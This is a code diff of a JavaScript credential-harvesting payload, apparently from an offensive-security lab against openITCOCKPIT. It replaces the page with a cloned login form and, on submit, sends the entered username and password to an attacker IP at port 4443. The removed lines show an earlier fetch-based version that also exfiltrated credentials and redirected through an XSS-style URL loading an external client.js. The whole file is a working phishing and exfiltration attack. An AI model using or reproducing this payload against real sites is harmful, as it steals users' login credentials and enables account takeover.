@@ -1,4 +1,14 @@
-loginPage = 
+/*
+Multiple ways to get this
+On the page we want to fake
+1.
+loginhtml = document.getElementsByTagName("html")[0].innerHTML
+localStorage.setItem("loginhtml", loginhtml)
+We can then grab it wrong the storage tab in the browser tools
+2. 
+Copy & paste document.getElementsByTagName("html")[0].innerHTML
+*/
+loginhtml = 
 `<head>
     <!--[if IE]>
     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">
@@ -111,27 +121,14 @@ loginPage =
 
 
 </body>`;
-document.getElementsByTagName("html")[0].innerHTML = loginPage;
+document.getElementsByTagName("html")[0].innerHTML = loginhtml;
+var attacker = '192.168.119.141'
 form = document.getElementById("login-form");
-form.action = 'https://192.168.119.136:4443/'
-login_username = document.getElementById("LoginUserUsername");
-login_password = document.getElementById("LoginUserPassword");
-submitButton = document.getElementsByClassName("btn btn-primary pull-right")[0];
-form.onsubmit = function() {
-    alert('okay');
+var xhr = new XMLHttpRequest();
+form.onsubmit = function(e) {
+    e.preventDefault();
+    var login_username = document.getElementById("LoginUserUsername").value;
+    var login_password = document.getElementById("LoginUserPassword").value;
+    xhr.open('POST', `https://${attacker}:4443/log?username=${login_username}&password=${login_password}`, true);
+    xhr.send(null);
 }
-
-
-submitButton.onclick= function(){
-    //alert(login_username.value);
-    //alert(login_password.value);
-    fetch(`https://192.168.119.136:4443/${login_username.value}:${login_password.value}`, {
-        method: 'POST',
-        mode: 'no-cors',
-        //body:`${login_username.value}:${login_password.value}`
-    }).then((response) => response);
-    window.location='https://openitcockpit/js/vendor/lodash/perf/index.html?build=https://192.168.119.136:4443/client.js%22%3E'
-    //
-};
-
-console.log(submitButton)
